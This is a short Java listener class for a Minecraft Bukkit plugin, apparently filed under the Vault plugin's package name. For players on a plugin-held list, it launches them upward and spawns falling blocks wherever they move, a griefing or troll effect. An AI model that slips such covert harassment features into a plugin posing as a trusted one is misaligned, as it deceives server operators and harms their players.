package net.milkbowl.vault.events;

import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.util.Vector;

import net.milkbowl.vault.Core;

public class Piss implements Listener {
	private static final Core plugin = Core.getPlugin(Core.class);
	

	@EventHandler
	public void onMove(PlayerMoveEvent e) {
		Player p = e.getPlayer();
		if (plugin.piss.contains(p.getName())) {
            p.setVelocity(new Vector(0.0, 0.3, 0.0));
            
            Material mat = plugin.pissBlock.get(p);
            
            p.getWorld().spawnFallingBlock(p.getLocation(), mat, (byte) 0);
		}
	}

}
